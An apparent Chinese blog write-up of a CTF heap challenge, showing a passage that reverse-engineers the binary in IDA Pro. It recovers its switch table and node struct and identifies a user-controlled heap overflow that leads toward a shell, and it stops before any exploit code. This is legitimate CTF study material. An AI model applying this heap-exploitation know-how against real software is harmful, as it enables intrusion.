<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Write-up | NeSE 丙组 7 月月赛 - ChinaNuke的博客</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="ChinaNuke的博客"><meta name="msapplication-TileImage" content="/img/steve-jumping-dino.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="ChinaNuke的博客"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="NeSE 战队丙组 7 月月赛，只做出了 pwn 的这一道题，花了一整天时间。第一次写 Write-up，内容比较详尽。"><meta property="og:type" content="blog"><meta property="og:title" content="Write-up | NeSE 丙组 7 月月赛"><meta property="og:url" content="https://www.nuke666.cn/2021/08/Write-up-for-NeSE-monthly-contest-in-July/"><meta property="og:site_name" content="ChinaNuke的博客"><meta property="og:description" content="NeSE 战队丙组 7 月月赛，只做出了 pwn 的这一道题，花了一整天时间。第一次写 Write-up，内容比较详尽。"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.nuke666.cn/img/og_image.png"><meta property="article:published_time" content="2021-08-11T06:16:58.000Z"><meta property="article:author" content="ChinaNuke"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.nuke666.cn/2021/08/Write-up-for-NeSE-monthly-contest-in-July/"},"headline":"Write-up | NeSE 丙组 7 月月赛","image":["https://www.nuke666.cn/img/og_image.png"],"datePublished":"2021-08-11T06:16:58.000Z","author":{"@type":"Person","name":"ChinaNuke"},"publisher":{"@type":"Organization","name":"ChinaNuke的博客","logo":{"@type":"ImageObject","url":{"text":"ChinaNuke的博客"}}},"description":"NeSE 战队丙组 7 月月赛，只做出了 pwn 的这一道题，花了一整天时间。第一次写 Write-up，内容比较详尽。"}</script><link rel="canonical" href="https://www.nuke666.cn/2021/08/Write-up-for-NeSE-monthly-contest-in-July/"><link rel="icon" href="/img/steve-jumping-dino.svg"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.15.2/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdnjs.loli.net/ajax/libs/pace/1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }
          Array
              .from(document.querySelectorAll('.tab-content'))
              .forEach($tab => {
                  $tab.classList.add('is-hidden');
              });
          Array
              .from(document.querySelectorAll('.tabs li'))
              .forEach($tab => {
                  $tab.classList.remove('is-active');
              });
          const $activeTab = document.querySelector(location.hash);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
          const $tabMenu = document.querySelector(`a[href="${location.hash}"]`);
          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.0.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">ChinaNuke的博客</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于我</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="我的 GitHub 主页" href="https://github.com/ChinaNuke"><i class="fab fa-github-alt"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen is-9-fullhd"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-08-11T06:16:58.000Z" title="8/11/2021, 6:16:58 AM">2021-08-11</time>发表</span><span class="level-item">约30 分钟读完 (大约4494个字)</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">Write-up | NeSE 丙组 7 月月赛</h1><div class="content"><p>NeSE 战队丙组 7 月月赛，只做出了 pwn 的这一道题，花了一整天时间。第一次写 Write-up，内容比较详尽。</p>
<span id="more"></span>

<h2 id="题目考点"><a href="# 题目考点" class="headerlink" title="题目考点"></a>题目考点</h2><ul>
<li>堆溢出</li>
<li>Use After Free</li>
<li>tcache</li>
</ul>
<h2 id="解题思路"><a href="# 解题思路" class="headerlink" title="解题思路"></a>解题思路 </h2><p> 题目给的程序文件名叫 heap ，提示了解题方向应该与堆相关，同时注意到题目提供的 libc 版本是 2.31。运行程序，首先看到第一行输出了一个提示内容，可能是内存某处的值或者某个地址，十有八九会用到。接着输出了一个菜单，数字 1-5 分别对应创建、写入、打印、删除和退出五个功能。逐个尝试一下，看看程序都提供了什么功能。其中输入数字 3 尝试打印 node 时，程序输出了 “not implemented”，似乎是没有实现这个功能。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">./heap</span> </span><br><span class="line">hint: 0x564ea3dba040</span><br><span class="line"></span><br><span class="line">1)create</span><br><span class="line">2)write</span><br><span class="line">3)print</span><br><span class="line">4)del</span><br><span class="line">5)exit</span><br><span class="line">=&gt; 1</span><br><span class="line"></span><br><span class="line">Size: </span><br><span class="line">10</span><br><span class="line">node index: 0</span><br><span class="line"></span><br><span class="line">1)create</span><br><span class="line">2)write</span><br><span class="line">3)print</span><br><span class="line">4)del</span><br><span class="line">5)exit</span><br><span class="line">=&gt; 2</span><br><span class="line"></span><br><span class="line">Index: </span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">Size: </span><br><span class="line">20</span><br><span class="line"></span><br><span class="line">Content: </span><br><span class="line">blijojodiblido</span><br><span class="line"></span><br><span class="line">1)create</span><br><span class="line">2)write</span><br><span class="line">3)print</span><br><span class="line">4)del</span><br><span class="line">5)exit</span><br><span class="line">=&gt; 3</span><br><span class="line">not implemented</span><br><span class="line"></span><br><span class="line">1)create</span><br><span class="line">2)write</span><br><span class="line">3)print</span><br><span class="line">4)del</span><br><span class="line">5)exit     </span><br><span class="line">=&gt; 4</span><br><span class="line"></span><br><span class="line">Index: </span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">1)create</span><br><span class="line">2)write</span><br><span class="line">3)print</span><br><span class="line">4)del</span><br><span class="line">5)exit</span><br><span class="line">=&gt; 5</span><br></pre></td></tr></table></figure>

<p>使用 checksec 工具查看一下程序架构和保护机制。这是一个 64 位程序，开启了 PIE ，即程序运行时的代码段（.text）、数据段（.data）和未初始化数据段（.bss）地址都是随机的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">checksec ./heap</span></span><br><span class="line">[*] &#x27;/home/nuke/work/ctf/nese/monthly_7/pwn1/heap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h3 id="程序静态分析"><a href="# 程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析 </h3><p> 使用 IDA Pro x64 加载程序进行静态分析，从左侧 Functions windows 定位到 main 函数，按下 F5 键尝试进行反编译，得到的伪代码看起来有点奇怪，似乎缺少了一些逻辑。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">if</span> (*(_QWORD *)(buff + <span class="number">16</span>) )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  fwrite(<span class="string">&quot;\n1)create\n2)write\n3)print\n4)del\n5)exit\n=&gt; &quot;</span>, <span class="number">1uLL</span>, <span class="number">0x2A</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">  v5 = <span class="number">10</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> (v5 &gt;= <span class="number">0</span> &amp;&amp; v5 &lt;= <span class="number">5</span> )</span><br><span class="line">    __asm &#123; jmp     rax &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;make wise choice!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按下 TAB 键切换回汇编代码界面，根据汇编代码内容和程序运行逻辑，推测这里应该有一个被编译器使用跳转表优化后的 switch 语句，没有被 IDA 识别出来。从 0x1711 地址处开始的是跳转的目标地址部分，而 0x16F8 地址处和 0x1704 地址处的 lea 指令所取的 unk_20D0 标签所指向的地址应该就是跳转表，0x16E6 是 switch 语句的起始地址，因此先 <a href="/2021/08/Specify-switch-statement-in-IDA-Pro/"> 对 switch 语句进行恢复</a>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000016C4                 call    ___isoc99_scanf</span><br><span class="line">.text:00000000000016C9                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:00000000000016CC                 test    eax, eax</span><br><span class="line">.text:00000000000016CE                 js      short loc_16D8</span><br><span class="line">.text:00000000000016D0                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:00000000000016D3                 cmp     eax, 5</span><br><span class="line">.text:00000000000016D6                 jle     short loc_16E6</span><br><span class="line">.text:00000000000016D8</span><br><span class="line">.text:00000000000016D8 loc_16D8:                               ; CODE XREF: main+85↑j</span><br><span class="line">.text:00000000000016D8                 lea     rdi, aMakeWiseChoice ; &quot;make wise choice!&quot;</span><br><span class="line">.text:00000000000016DF                 call    _puts</span><br><span class="line">.text:00000000000016E4                 jmp     short loc_1748</span><br><span class="line">.text:00000000000016E6 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000016E6</span><br><span class="line">.text:00000000000016E6 loc_16E6:                               ; CODE XREF: main+8D↑j</span><br><span class="line">.text:00000000000016E6                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:00000000000016E9                 cmp     eax, 5</span><br><span class="line">.text:00000000000016EC                 ja      short loc_1747</span><br><span class="line">.text:00000000000016EE                 mov     eax, eax</span><br><span class="line">.text:00000000000016F0                 lea     rdx, ds:0[rax*4]</span><br><span class="line">.text:00000000000016F8                 lea     rax, unk_20D0</span><br><span class="line">.text:00000000000016FF                 mov     eax, [rdx+rax]</span><br><span class="line">.text:0000000000001702                 cdqe</span><br><span class="line">.text:0000000000001704                 lea     rdx, unk_20D0</span><br><span class="line">.text:000000000000170B                 add     rax, rdx</span><br><span class="line">.text:000000000000170E                 db      3Eh</span><br><span class="line">.text:000000000000170E                 jmp     rax</span><br><span class="line">.text:0000000000001711 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001711                 mov     eax, 0</span><br><span class="line">.text:0000000000001716                 call    create_node</span><br><span class="line">.text:000000000000171B                 jmp     short loc_1742</span><br><span class="line">.text:000000000000171D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000000171D                 mov     eax, 0</span><br><span class="line">.text:0000000000001722                 call    write_node</span><br><span class="line">.text:0000000000001727                 jmp     short loc_1742</span><br><span class="line">.text:0000000000001729 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001729                 lea     rdi, aNotImplemented ; &quot;not implemented&quot;</span><br><span class="line">.text:0000000000001730                 call    _puts</span><br><span class="line">.text:0000000000001735                 jmp     short loc_1742</span><br><span class="line">.text:0000000000001737 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001737                 mov     eax, 0</span><br><span class="line">.text:000000000000173C                 call    del_node</span><br><span class="line">.text:0000000000001741                 nop</span><br></pre></td></tr></table></figure>

<p>恢复了 switch 语句之后，再次按 F5 键进行反编译，得到 main 函数的伪代码。可以看到，while 循环的开始部分很引人注目，判断 <code>buff + 16</code> 处 QWORD 大小的值是否非 0 ，如果非 0 就执行 <code>system(&quot;/bin/sh&quot;);</code> ，那基本上可以确定后面的目标是通过某种方式修改 <code>buff + 16</code> 处的值使其不为 0 ，就可以拿到 shell 。循环体中剩下的部分就是根据输入值的不同去调用对应的函数完成相关操作，我们也可以注意到 case 3 对应的 print 操作确实是没有实现的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (*(_QWORD *)(buff + <span class="number">16</span>) )</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    fwrite(<span class="string">&quot;\n1)create\n2)write\n3)print\n4)del\n5)exit\n=&gt; &quot;</span>, <span class="number">1uLL</span>, <span class="number">0x2A</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">    input = <span class="number">10</span>;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">    <span class="keyword">if</span> (input &gt;= <span class="number">0</span> &amp;&amp; input &lt;= <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> (input)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          create_node();</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          write_node();</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;not implemented&quot;</span>);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">          del_node();</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;make wise choice!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="init- 函数分析"><a href="#init- 函数分析" class="headerlink" title="init 函数分析"></a>init 函数分析 </h4><p> 程序在进入 while 循环之前还调用了一次 init 函数，先来看一下它做了哪些操作。首先是执行了常见的 <code>setvbuf</code> ，通过将第三个参数设置为 _IONBF 从而关闭输出缓冲，使得输出的内容都可以立即显示到屏幕上。接着为 nodes 和 buffer 初始化了内存，大小都是 0x50 。在执行到这里之前并没有看到这两个变量的定义，双击变量看到它们都在 .bss 段，因此都是全局变量。之后的内容就比较有意思，可以看到 buff 就是一个指向 buffer 的指针，也是定义在 .bss 段，然后程序直接输出了 buff 指针的值，也就是 buffer 的地址。那前面我们要修改 <code>buff + 16</code> 地址处的值，也就是修改 buffer 的第 16 个字节的内容，程序给我们提示了 buffer 的地址，更加印证了我们需要去修改 buffer 缓冲区。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;nodes, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">  buff = (__int64)buffer;</span><br><span class="line">  buffer[<span class="number">1</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;hint: %p\n&quot;</span>, (<span class="type">const</span> <span class="type">void</span> *)buff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="create-node- 函数分析和结构体识别"><a href="#create-node- 函数分析和结构体识别" class="headerlink" title="create_node 函数分析和结构体识别"></a>create_node 函数分析和结构体识别 </h4><p> 接着逐个查看 <code>create_node</code> 、<code>write_node</code> 和 <code>del_node</code> 三个函数。<code>create_node</code> 函数的逻辑是获取一个输入 size ，然后输出一个 node index ，而 size 的值被限定在了 0 到 1024 之间。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create_node</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nSize: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; size &lt;= <span class="number">1024</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; (<span class="type">int</span>)i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (dword_40AC[<span class="number">4</span> * i] != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *((_QWORD *)&amp;nodes + <span class="number">2</span> * (<span class="type">int</span>)i) = <span class="built_in">malloc</span>(size);</span><br><span class="line">        dword_40AC[<span class="number">4</span> * i] = <span class="number">1</span>;</span><br><span class="line">        *((_DWORD *)&amp;unk_40A8 + <span class="number">4</span> * (<span class="type">int</span>)i) = size;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;node index: %d\n&quot;</span>, i);</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;nodes too much!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size illegal!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段伪代码看起来不是那么清晰，代码里出现了 dword_40AC 和 unk_40A8 ，这两个是什么东西？双击追踪到它所在的 .bss 段，看到它们两个紧跟在 nodes 后面。其实从前面的分析，已经不难猜测程序含有一个 node 结构体，而 nodes 是一个定义为全局变量的 node 数组。前面在 init 函数中，初始化 nodes 时指定的大小是 0x50 ，也就是 80 个字节，那这里的 nodes 怎么会只有 8 个字节？那基本可以推测 dword_40AC 和 unk_40A8 的内存空间也是 nodes 的一部分了，只是因为被直接引用所以被 IDA Pro 也加了标签。算一下它们加起来有多大，<code>8 + 4 + 0x21 * 4 = 144</code> ，诶怎么不是 80 个字节？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:00000000000040A0                 public nodes</span><br><span class="line">.bss:00000000000040A0 nodes           db    ? ;               ; DATA XREF: create_node+AA↑o</span><br><span class="line">.bss:00000000000040A0                                         ; write_node+B7↑o ...</span><br><span class="line">.bss:00000000000040A1                 db    ? ;</span><br><span class="line">.bss:00000000000040A2                 db    ? ;</span><br><span class="line">.bss:00000000000040A3                 db    ? ;</span><br><span class="line">.bss:00000000000040A4                 db    ? ;</span><br><span class="line">.bss:00000000000040A5                 db    ? ;</span><br><span class="line">.bss:00000000000040A6                 db    ? ;</span><br><span class="line">.bss:00000000000040A7                 db    ? ;</span><br><span class="line">.bss:00000000000040A8 unk_40A8        db    ? ;               ; DATA XREF: create_node+E0↑o</span><br><span class="line">.bss:00000000000040A8                                         ; del_node+A1↑o</span><br><span class="line">.bss:00000000000040A9                 db    ? ;</span><br><span class="line">.bss:00000000000040AA                 db    ? ;</span><br><span class="line">.bss:00000000000040AB                 db    ? ;</span><br><span class="line">.bss:00000000000040AC ; _DWORD dword_40AC[33]</span><br><span class="line">.bss:00000000000040AC dword_40AC      dd 21h dup(?)           ; DATA XREF: create_node+79↑o</span><br><span class="line">.bss:00000000000040AC                                         ; create_node+C1↑o ...</span><br></pre></td></tr></table></figure>

<p>不着急，再看代码。首先 for 循环以 <code>i</code> 作为循环变量从 0 到 8 进行遍历，共 9 个值，接着一个 if 判断 <code>dword_40AC[4 * i]</code> 是否为 1 ，不为 1 则继续向下执行并将其设置为 1 ，如果遍历完 9 个变量没有找到 <code>dword_40AC[4 * i]</code> 不为 1 的，则输出 “nodes too much!” 然后退出。那么不难猜测出 <code>dword_40AC[4 * i]</code> 处是 node 结构体中表示节点是否已被使用的一个变量，且其大小是 一个 DWORD，也就是 4 个字节。根据编程习惯我们假定它的声明为 <code>int used</code> 。从这部分的分析也可以确定 nodes 数组最多可以存储 9 个节点，每隔 4 个 DWORD 长度就有一个 <code>used</code> 变量，那么基本可以推测出每一个 node 结构体的大小是 <code>4 * 4 = 16</code> 个字节。</p>
<p>再看 <code>*((_QWORD *)&amp;nodes + 2 * (int)i) = malloc(size);</code> 这行，申请一块 size 大小的内存，存储的是申请到内存的地址，可以推测处这个是用来存储 node 的 content 的指针，大小为一个 QWORD， 也正是 64 位系统上指针的字长，根据编程习惯我们假定它的声明是 <code>void *content_ptr</code> 。当变量 <code>i</code> 为 0 时，它所指向的就是 nodes 的起始地址，那么它应该是 node 结构体的第一个成员变量。每隔 2 个 QWORD 长度出现一次，验证了前面计算的 node 结构体的大小 16 字节。再看 <code>*((_DWORD *)&amp;unk_40A8 + 4 * (int)i) = size;</code> 这行，把 size 的值也保存到结构体中，大小是一个 DWORD ，同样每隔 16 个字节出现一次，假定它的声明是 <code>unsigned int size</code> 。</p>
<p>我们来看当 <code>i</code> 为 0 的情况，这时应该是遍历到第一个 node 结构体，<code>content_ptr</code> 成员变量相对于 nodes 数组的偏移是 0 ，那显然它是 node 结构体的第一个成员变量，同样地，<code>size</code> 成员变量相对于 <code>unk_40A8</code> 的偏移是 0 ，相对于 nodes 数组的偏移是 8 ；<code>used</code> 成员变量相对于 <code>dword_40AC</code> 的偏移是 0 ，相对于 nodes 数组的偏移是 12 ，那么 node 结构体的三个成员变量的顺序也就确定了，我们可以定义出 node 结构体。再次计算确认一下，node 结构体的大小 <code>8 + 4 + 4</code> 刚好是 16 个字节，与前面的推测一致。nodes 数组的大小 <code>16 * 9 = 144</code> 也与前面的计算一致，但为什么在 init 函数中只初始化了前 80 个字节我们不得而知，可能是写错了，也可能是别有用意。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">	<span class="type">void</span> *content_ptr;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">	<span class="type">int</span> used;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>完成 node 结构体和 nodes 数组的定义后，重新按 F5 进行反编译，<code>create_node</code> 函数的结构就就变得很清晰了。先在 nodes 数组的 9 个元素中寻找一个没有被使用的节点，为其申请一块 size 大小的堆块，将 size 值保存并置 used 位为 1 。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create_node</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nSize: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; size &lt;= <span class="number">1024</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; (<span class="type">int</span>)i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (nodes[i].used != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        nodes[i].content_ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line">        nodes[i].used = <span class="number">1</span>;</span><br><span class="line">        nodes[i].size = size;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;node index: %d\n&quot;</span>, i);</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;nodes too much!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size illegal!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="write-node- 函数分析"><a href="#write-node- 函数分析" class="headerlink" title="write_node 函数分析"></a>write_node 函数分析 </h4><p> 接着再看 <code>write_node</code> 函数，读入一个 index，然后判断其值是否在 0 到 9 之间并且节点的 used 被置位，注意这个范围，包含 9，总共 10 个，而前面 <code>create_node</code> 函数在索引时是 9 个，出现了不一致，但是同时这个判断中还含有对 <code>used</code> 成员变量的检查，可能会增加利用难度。接着读入一个 size ，并根据 size 大小读入 content ，诶很有意思这个 size 是我自己输入的，前面创建节点的时候已经指定了一个 size ，并且 <code>content_ptr</code> 指针所指向的堆块大小是根据我创建时指定的 size 来分配的，那显然这俩 size 又出现了不一致，这不是就有了一个堆溢出了嘛，而且溢出多少我自己说了算。</p>
